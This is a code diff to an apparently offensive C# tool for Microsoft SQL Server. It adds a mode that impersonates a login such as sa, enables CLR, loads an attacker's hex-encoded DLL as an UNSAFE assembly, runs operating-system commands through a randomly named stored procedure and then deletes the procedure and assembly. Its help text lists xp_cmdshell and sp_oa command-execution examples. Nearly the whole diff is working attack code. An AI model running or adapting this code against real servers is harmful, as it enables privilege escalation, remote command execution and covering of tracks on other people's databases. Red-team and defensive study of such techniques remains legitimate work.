@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Linq;
 using System.Data.SqlClient;
 
@@ -28,11 +29,12 @@ namespace n0iseSQL
                 Console.WriteLine("\tauthenticate");
                 Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                 Console.WriteLine("\tenumLoginImpersonation");
-                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
+                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                 Console.WriteLine("\t\texample: impersonateLogin sa none");
                 Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                 Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                 Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
+                Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHex whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                 Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                 Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
 
@@ -63,12 +65,12 @@ namespace n0iseSQL
             {
                 if (args.Length < 5)
                 {
-                    Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
+                    Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                     Console.WriteLine("\t\texample: impersonateLogin sa none");
                     Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                     Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                     Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
-
+                    Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHexFile whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                     return;
                 } else
                 {
@@ -76,11 +78,12 @@ namespace n0iseSQL
                     {
                         if (args.Length < 6)
                         {
-                            Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
+                            Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                             Console.WriteLine("\t\texample: impersonateLogin sa none");
                             Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                             Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                             Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
+                            Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHexFile whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                             return;
                         }
                     }
@@ -276,6 +279,55 @@ namespace n0iseSQL
 
                     Console.WriteLine("[+] Creating stored procedure {0}...", randomProcedureName);
                     String createPro = String.Format("CREATE PROCEDURE [dbo].[{0}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{1}].[StoredProcedures].[n0iseSQLExec];",randomProcedureName,randomAssemblyName);
+                    command = new SqlCommand(createPro, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Executing command {0}", commandToExecute);
+                    String assemblyExecCmd = String.Format("EXEC {0} '{1}'", randomProcedureName, commandToExecute);
+                    command = new SqlCommand(assemblyExecCmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("[+] loadAssembly command execution result is: " + reader[0]);
+                    reader.Close();
+
+                    //cleanup
+                    Console.WriteLine("[+] Dropping stored procedure {0}...", randomProcedureName);
+                    String dropProcedure = String.Format("DROP PROCEDURE [dbo].[{0}];", randomProcedureName);
+                    command = new SqlCommand(dropProcedure, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Dropping assembly {0}...", randomAssemblyName);
+                    String dropAssembly = String.Format("DROP ASSEMBLY [{0}];", randomAssemblyName);
+                    command = new SqlCommand(dropAssembly, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+                }
+
+                if (execType == "loadAssemblyFromHexFile")
+                {
+                    String commandToExecute = args[5].ToString();
+                    String hexAssemblyFile = args[6].ToString(); //convert dll to hex using ps1 script on git and provide path to txt file containing hex like 0xAD0983483...
+                    String randomAssemblyName = RandomString(8);
+                    String randomProcedureName = RandomString(8);
+                    //for SQL 2017+:
+                    //String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
+                    //for SQL2016-:
+                    String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;";
+                    command = new SqlCommand(enable_options, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Creating assembly {0} using hex assembly input...", randomAssemblyName);
+                    String hexAssembly = File.ReadAllText(hexAssemblyFile);
+                    String createAsm = String.Format("CREATE ASSEMBLY {0} FROM {1} WITH PERMISSION_SET = UNSAFE", randomAssemblyName, hexAssembly);
+                    command = new SqlCommand(createAsm, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Creating stored procedure {0}...", randomProcedureName);
+                    String createPro = String.Format("CREATE PROCEDURE [dbo].[{0}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{1}].[StoredProcedures].[n0iseSQLExec];", randomProcedureName, randomAssemblyName);
                     command = new SqlCommand(createPro, con);
                     reader = command.ExecuteReader();
                     reader.Close();
